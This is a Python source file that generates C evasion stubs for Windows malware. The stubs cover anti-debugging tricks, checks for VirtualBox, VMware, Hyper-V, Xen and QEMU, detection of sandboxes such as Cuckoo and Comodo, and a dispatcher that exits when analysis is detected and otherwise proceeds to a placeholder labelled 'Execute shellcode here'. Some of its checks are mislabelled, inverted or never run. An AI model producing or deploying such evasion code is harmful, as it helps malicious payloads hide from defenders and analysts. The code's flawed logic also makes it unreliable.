"""
Behavioral Evasion Suite
Anti-debugging, anti-virtualization, anti-sandbox detection and evasion
"""

import textwrap


class AntiDebugTechniques:
    """Anti-debugging detection and evasion"""
    
    @staticmethod
    def generate_anti_debug_code():
        """Generate code to detect and thwart debuggers"""
        
        c_code = """
#include <windows.h>
#include <stdio.h>

// ═══════════════════════════════════════════════════
// ANTI-DEBUGGING MODULE
// ═══════════════════════════════════════════════════

// Method 1: IsDebuggerPresent API
BOOL CheckDebuggerPresent_Method1() {
    return IsDebuggerPresent();
}

// Method 2: NtGlobalFlag checking
BOOL CheckDebuggerPresent_Method2() {
    PPEB peb = (PPEB)__readgsqword(0x60);  // PEB address in x64
    return (peb->NtGlobalFlag & 0x70) != 0;  // FLG_HEAP_ENABLE_TAG_BY_DLL, etc.
}

// Method 3: ForceFlags check
BOOL CheckDebuggerPresent_Method3() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;
    
    // If process was started under debugger, ForceFlags will be set
    return ldr->SsHandle != NULL;
}

// Method 4: Trap flag modification
BOOL CheckDebuggerPresent_Method4() {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(GetCurrentThread(), &ctx);
    
    // Set trap flag (TF bit in EFLAGS)
    ctx.EFlags |= 0x100;
    SetThreadContext(GetCurrentThread(), &ctx);
    
    // If debugger present, next instruction will trigger breakpoint
    __try {
        // This instruction will cause SIGTRAP if debugged
        __asm { nop }
        return FALSE;  // Not debugged
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return TRUE;   // Debugger caught the trap
    }
}

// Method 5: SoftICE detection
BOOL CheckForSoftICE() {
    __try {
        __asm int 3
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;  // Not SoftICE
    }
    return TRUE;  // SoftICE detected
}

// Method 6: Olly/WinDbg detection via exception handling
BOOL CheckForSpecificDebugger() {
    // Check for OutputDebugString hook
    // This is tricky to detect directly
    
    // Alternative: Check process name for known debuggers
    char process_path[MAX_PATH];
    GetModuleFileNameA(NULL, process_path, MAX_PATH);
    
    const char* debuggers[] = {
        "ollydbg.exe",
        "windbg.exe",
        "ida64.exe",
        "ida.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        NULL
    };
    
    for (int i = 0; debuggers[i]; i++) {
        if (strstr(process_path, debuggers[i])) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// Master anti-debug function
BOOL IsBeingDebugged() {
    if (CheckDebuggerPresent_Method1()) return TRUE;
    if (CheckDebuggerPresent_Method2()) return TRUE;
    if (CheckDebuggerPresent_Method3()) return TRUE;
    if (CheckForSoftICE()) return TRUE;
    if (CheckForSpecificDebugger()) return TRUE;
    
    return FALSE;
}

// Breakpoint prevention
void PreventBreakpoints() {
    // Hook breakpoint interrupt
    // Install custom exception handler that skips breakpoints
    
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)ExceptionHandler);
}

LONG WINAPI ExceptionHandler(EXCEPTION_POINTERS* pExcept) {
    // Skip over BREAKPOINT exceptions
    if (pExcept->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        pExcept->ContextRecord->Rip += 1;  // Skip breakpoint instruction
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}
"""
        
        return c_code


class AntiVirtualizationTechniques:
    """Detect and evade virtualization/sandboxing"""
    
    @staticmethod
    def generate_anti_vm_code():
        """Generate code to detect virtual machines"""
        
        c_code = """
#include <windows.h>
#include <stdio.h>
#include <string.h>

// ═══════════════════════════════════════════════════
// ANTI-VIRTUALIZATION MODULE
// ═══════════════════════════════════════════════════

// Detect VirtualBox
BOOL DetectVirtualBox() {
    // Check for VirtualBox DLLs
    if (GetModuleHandleA("VBoxMR.dll")) return TRUE;
    if (GetModuleHandleA("VBoxControl.exe")) return TRUE;
    if (GetModuleHandleA("VBoxVmSvc.exe")) return TRUE;
    
    // Check for VirtualBox device drivers
    HANDLE hFile = CreateFileA("\\\\.\\VBoxGuest", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        return TRUE;
    }
    
    // Check system devices
    const char* vbox_devices[] = {
        "\\\\.\\VBoxGuest",
        "\\\\.\\VBoxHID",
        NULL
    };
    
    for (int i = 0; vbox_devices[i]; i++) {
        hFile = CreateFileA(vbox_devices[i], 0, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            return TRUE;
        }
    }
    
    return FALSE;
}

// Detect VMware
BOOL DetectVMware() {
    // Check for VMware DLLs
    if (GetModuleHandleA("vmGuestLib.dll")) return TRUE;
    if (GetModuleHandleA("vmtoolsd.exe")) return TRUE;
    
    // Check registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256];
        DWORD size = sizeof(value);
        
        if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "VMware") || strstr(value, "VMWARE")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    return FALSE;
}

// Detect Hyper-V
BOOL DetectHyperV() {
    // Check registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256];
        DWORD size = sizeof(value);
        
        if (RegQueryValueExA(hKey, "BaseBoardProduct", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "Hyper-V")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    return FALSE;
}

// Detect Xen
BOOL DetectXen() {
    // Check for Xen-specific registry entries
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\XEN", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    return FALSE;
}

// Detect QEMU
BOOL DetectQEMU() {
    // Check for QEMU DLL
    if (GetModuleHandleA("qemu-ga.exe")) return TRUE;
    
    // Check registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256];
        DWORD size = sizeof(value);
        
        if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "QEMU")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    return FALSE;
}

// Master VM detection
BOOL IsVirtualMachine() {
    if (DetectVirtualBox()) return TRUE;
    if (DetectVMware()) return TRUE;
    if (DetectHyperV()) return TRUE;
    if (DetectXen()) return TRUE;
    if (DetectQEMU()) return TRUE;
    
    return FALSE;
}

// Check total system RAM (VMs often have less)
BOOL HasSuspiciousRAM() {
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(memStat);
    
    if (GlobalMemoryStatusEx(&memStat)) {
        UINT64 totalRAM = memStat.ullTotalPhys;
        
        // Suspicious if less than 512MB
        if (totalRAM < (512 * 1024 * 1024)) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// Check number of processors (VMs often have fewer)
BOOL HasSuspiciousProcessorCount() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    return sysInfo.dwNumberOfProcessors < 2;
}
"""
        
        return c_code


class AntiSandboxTechniques:
    """Detect and evade sandbox environments"""
    
    @staticmethod
    def generate_anti_sandbox_code():
        """Generate code to detect sandboxes"""
        
        c_code = """
#include <windows.h>
#include <stdio.h>
#include <time.h>

// ═══════════════════════════════════════════════════
// ANTI-SANDBOX MODULE
// ═══════════════════════════════════════════════════

// Detect Cuckoo sandbox
BOOL DetectCuckooSandbox() {
    // Check for Cuckoo DLL
    if (GetModuleHandleA("cuckoomon.dll")) return TRUE;
    
    // Check registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Cuckoo", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    return FALSE;
}

// Detect Comodo Sandbox
BOOL DetectComodoSandbox() {
    // Check for COMODO DLLs and processes
    if (GetModuleHandleA("cmdcore.dll")) return TRUE;
    
    // Check if running in COMODO container
    char path[MAX_PATH];
    GetWindowsDirectoryA(path, MAX_PATH);
    
    // COMODO sandboxes often have specific registry markers
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\COMODO", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    return FALSE;
}

// Detect Firejail
BOOL DetectFirejail() {
    // Check environment variables set by Firejail
    if (getenv("FIREJAIL") != NULL) return TRUE;
    if (getenv("FIREJAIL_OPT") != NULL) return TRUE;
    
    return FALSE;
}

// Timing analysis - sandboxes often slow down code
BOOL PerformTimingCheck() {
    LARGE_INTEGER start, end, freq;
    
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Perform some work
    unsigned long sum = 0;
    for (unsigned int i = 0; i < 1000000; i++) {
        sum += i;
    }
    
    QueryPerformanceCounter(&end);
    
    // Calculate time
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    
    // If taking significantly longer, might be sandboxed
    if (elapsed > 1.0) {  // More than 1 second for simple loop = suspicious
        return TRUE;
    }
    
    return FALSE;
}

// Check for unusual process list (common in sandboxes)
BOOL HasSuspiciousProcesses() {
    // Known sandbox/analysis tools
    const char* suspicious[] = {
        "winafl",
        "frida-server",
        "vboxservice",
        "vmtoolsd",
        "qemu-ga",
        "analyzer",
        NULL
    };
    
    // Would need to enumerate running processes
    // This is simplified - real version uses CreateToolhelp32Snapshot
    
    return FALSE;
}

// Check filesystem for sandbox artifacts
BOOL HasSandboxArtifacts() {
    // Check for common sandbox directories
    const char* sandbox_dirs[] = {
        "C:\\Cuckoo",
        "C:\\COMODO\\Sandbox",
        "C:\\Firejail",
        NULL
    };
    
    for (int i = 0; sandbox_dirs[i]; i++) {
        if (GetFileAttributesA(sandbox_dirs[i]) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }
    
    return FALSE;
}

// Master sandbox detection
BOOL IsSandboxed() {
    if (DetectCuckooSandbox()) return TRUE;
    if (DetectComodoSandbox()) return TRUE;
    if (DetectFirejail()) return TRUE;
    if (PerformTimingCheck()) return TRUE;
    if (HasSandboxArtifacts()) return TRUE;
    
    return FALSE;
}
"""
        
        return c_code


class BehavioralEvasion:
    """High-level behavioral evasion wrapper"""
    
    def __init__(self):
        self.anti_debug = AntiDebugTechniques()
        self.anti_vm = AntiVirtualizationTechniques()
        self.anti_sandbox = AntiSandboxTechniques()
    
    def generate_full_evasion_stub(self, evasion_level='high'):
        """
        Generate complete evasion stub with multiple techniques
        
        evasion_level:
            'low': Only anti-debug
            'medium': Anti-debug + anti-VM
            'high': All techniques
        """
        
        stub = "#include <windows.h>\n"
        stub += "#include <stdio.h>\n\n"
        
        if evasion_level in ['low', 'medium', 'high']:
            stub += "// Anti-Debug Techniques\n"
            stub += self.anti_debug.generate_anti_debug_code()
            stub += "\n\n"
        
        if evasion_level in ['medium', 'high']:
            stub += "// Anti-Virtualization Techniques\n"
            stub += self.anti_vm.generate_anti_vm_code()
            stub += "\n\n"
        
        if evasion_level == 'high':
            stub += "// Anti-Sandbox Techniques\n"
            stub += self.anti_sandbox.generate_anti_sandbox_code()
            stub += "\n\n"
        
        # Add main dispatcher
        stub += self._generate_evasion_dispatcher(evasion_level)
        
        return stub
    
    @staticmethod
    def _generate_evasion_dispatcher(evasion_level):
        """Generate main dispatcher function"""
        
        dispatcher = """
// ═══════════════════════════════════════════════════
// EVASION DISPATCHER
// ═══════════════════════════════════════════════════

BOOL CheckAllEvasion() {
    BOOL found_threats = FALSE;
    
"""
        
        if evasion_level in ['low', 'medium', 'high']:
            dispatcher += """    // Check for debuggers
    if (IsBeingDebugged()) {
        printf("[!] Debugger detected\\n");
        found_threats = TRUE;
    }

"""
        
        if evasion_level in ['medium', 'high']:
            dispatcher += """    // Check for virtual machines
    if (IsVirtualMachine()) {
        printf("[!] Virtual machine detected\\n");
        found_threats = TRUE;
    }
    
    if (HasSuspiciousRAM()) {
        printf("[!] Suspicious RAM size\\n");
        found_threats = TRUE;
    }
    
    if (HasSuspiciousProcessorCount()) {
        printf("[!] Suspicious processor count\\n");
        found_threats = TRUE;
    }

"""
        
        if evasion_level == 'high':
            dispatcher += """    // Check for sandboxes
    if (IsSandboxed()) {
        printf("[!] Sandbox detected\\n");
        found_threats = TRUE;
    }

"""
        
        dispatcher += """    return found_threats;
}

// Exit strategy - graceful or aggressive
void HandleEvasionFailure(BOOL graceful) {
    if (graceful) {
        printf("[*] Analysis environment detected. Exiting gracefully.\\n");
        exit(0);
    } else {
        // Aggressive: Crash the analysis tool or sandbox
        TerminateProcess(GetCurrentProcess(), 1);
    }
}

int main() {
    // Check evasion
    if (CheckAllEvasion()) {
        HandleEvasionFailure(TRUE);  // Graceful exit
        return 1;
    }
    
    printf("[+] Safe to execute\\n");
    
    // Execute shellcode here
    // ...
    
    return 0;
}
"""
        
        return dispatcher
    
    def get_evasion_techniques(self):
        """List available evasion techniques"""
        return {
            'anti_debug': [
                'IsDebuggerPresent API',
                'NtGlobalFlag checking',
                'ForceFlags inspection',
                'Trap flag detection',
                'SoftICE detection',
                'Process name checking',
            ],
            'anti_vm': [
                'VirtualBox detection',
                'VMware detection',
                'Hyper-V detection',
                'Xen detection',
                'QEMU detection',
                'RAM size checking',
                'Processor count checking',
            ],
            'anti_sandbox': [
                'Cuckoo sandbox detection',
                'COMODO sandbox detection',
                'Firejail detection',
                'Timing analysis',
                'Suspicious process checking',
                'Sandbox artifact detection',
            ]
        }
